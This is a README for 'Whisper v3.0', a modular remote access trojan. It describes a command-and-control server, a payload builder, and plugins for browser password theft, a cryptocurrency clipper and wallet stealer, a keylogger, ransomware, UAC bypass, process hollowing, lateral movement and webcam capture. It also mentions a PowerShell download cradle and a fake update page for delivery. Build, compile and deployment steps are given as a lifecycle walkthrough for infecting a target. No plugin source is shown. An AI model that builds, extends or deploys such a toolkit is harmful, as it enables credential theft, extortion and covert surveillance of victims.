# Whisper v3.0 — Modular RAT with Plugin System

**WARNING: For authorized security testing and educational purposes ONLY.**

## Architecture

```
whisper/
├── server.py             # C2 server with dark-themed GUI
├── builder.py            # Plugin builder GUI (select plugins, configure, build)
├── whisper.py            # Unified launcher combining server + builder + web server
├── stub_generator.py     # Generates minimal stubs from selected plugins
├── stub_c.c              # Native C stub with full encryption (compile with MinGW/MSVC)
├── test_all.py           # E2E test suite (41 tests)
├── test_units.py         # Unit tests for crypto, stub gen, plugin registry (168 tests)
├── plugins/              # 20 plugin modules — load only what you need
│   ├── anti_vm.py        # VM/sandbox detection
│   ├── browser_harvest.py# Saved passwords/cookies from Chrome, Edge, Firefox
│   ├── clipboard.py      # Clipboard read, write, monitor
│   ├── crypto_clipper.py # Cryptocurrency address replacement clipper
│   ├── crypto_steal.py   # Cryptocurrency wallet file hunter
│   ├── dns_hijack.py     # DNS spoofing via hosts file
│   ├── file_hunter.py    # File content search with regex
│   ├── file_manager.py   # File listing, upload, download, delete, execute, search
│   ├── hvnc.py           # Hidden desktop (HVNC)
│   ├── keylogger.py      # Keystroke capture
│   ├── lateral.py        # Lateral movement (psexec, wmi, dcom, rdp)
│   ├── persistence.py    # Multi-method persistence (Win/Linux/macOS)
│   ├── process_inject.py # Shellcode injection and process hollowing
│   ├── ransomware.py     # File encryption/decryption
│   ├── screenshot.py     # Desktop screenshot (PIL/mss)
│   ├── shell.py          # Remote command execution
│   ├── uac_bypass.py     # UAC bypass with auto-elevated reconnect
│   ├── vuln_scan.py      # Local vulnerability scanning
│   ├── webcam.py         # Webcam photo capture
│   └── wifi_harvest.py   # Saved WiFi passwords (Windows)
├── stager.ps1            # PowerShell download cradle
├── web_server.py         # HTTP delivery server with fake update page
├── requirements.txt      # Pinned optional dependencies
├── pyproject.toml        # Python project metadata
└── .github/workflows/    # CI pipeline (Windows + Linux + lint)
```

## Features

- **Modular Plugin System** — Select only the capabilities you need per stub
- **Minimal Stubs** — Python stubs as small as 3.8KB source, C stubs <50KB
- **Authenticated Encryption** — HMAC-SHA256 stream cipher with PBKDF2 key derivation (IV+tag+ct)
- **Process Hollowing** — 32/64-bit with PE parsing, section mapping, relocations, thread fixup
- **UAC Bypass** — Self-elevation with temp stub deploy and elevated session reconnect
- **Multi-Method Persistence** — Run key, Startup folder, WMI (Windows); autostart, crontab (Linux); LaunchAgent (macOS)
- **Browser Harvesting** — Extract saved passwords from Chrome, Edge, Firefox
- **WiFi Harvesting** — Dump saved wireless passwords via `netsh`
- **Webcam Capture** — Single-shot photo via OpenCV
- **Hidden Desktop (HVNC)** — Create and interact with a hidden Windows desktop
- **Keylogger** — Windows native (GetAsyncKeyState) / Linux (pynput)
- **Lateral Movement** — PsExec, WMI, DCOM, RDP credential harvesting
- **Zero Dependencies** — Core agent runs on stdlib only

## Quick Start

```
pip install pyinstaller mss pillow opencv-python cryptography
python builder.py
```

In the builder:
1. Configure C2 host/port/password
2. Check the plugins you want in your stub
3. Click **Generate .py** for source, or **Build EXE** for a compiled binary
4. Click **Start Web Server** to host the payload
5. Run `python server.py` on the controller to receive connections

## Full Lifecycle Example

```
# Controller: start the C2 server
python server.py

# Controller: build a stub
python builder.py
# → Set C2 host to your IP, port 4443, password "secret"
# → Check "shell", "file_manager", "screenshot"
# → Click "Generate .py" → saves agent.py in build/

# Deploy agent.py on the target (or compile with PyInstaller for EXE)
# Agent connects back to your C2 server automatically

# In server.py GUI, right-click the session and run:
#   shell whoami              → SYSTEM
#   ls C:\Users\              → directory listing
#   screenshot                → desktop image
#   download C:\report.pdf    → retrieve file
```

## Stub Sizes

| Configuration | Source Size |
|--------------|------------|
| shell + file_manager | 3.9 KB |
| 5 plugins | ~8 KB |
| 10 plugins | ~12 KB |
| All 20 plugins | ~20 KB |
| C stub (compiled EXE) | ~30-45 KB |

## Testing

```
python test_all.py       # 41 E2E tests (server, session lifecycle, plugins)
python test_units.py     # 168 unit tests (crypto, stub generation, plugin registry)
```

Clear `__pycache__` before running tests after code changes.

## Compiling the C Stub

MinGW: `gcc -Os -s -o stub.exe stub_c.c -lws2_32 -lbcrypt -ladvapi32`
MSVC: `cl /O1 /GS- stub_c.c /link ws2_32.lib bcrypt.lib advapi32.lib`

The C stub implements the same crypto protocol as the Python agent:
PBKDF2-HMAC-SHA256 → HMAC-SHA256 stream cipher → base64 framing.

## Plugin System

Each plugin in `plugins/` exports:
- `PLUGIN` dict — name, description, dependencies, size estimate
- `STUB_CODE` — raw Python code injected into the generated stub
- `get_commands()` — maps command names to handler functions

The `stub_generator.py` reads only the selected plugins and assembles a minimal agent containing just those capabilities.

## License

MIT — See [LICENSE](LICENSE) for details.
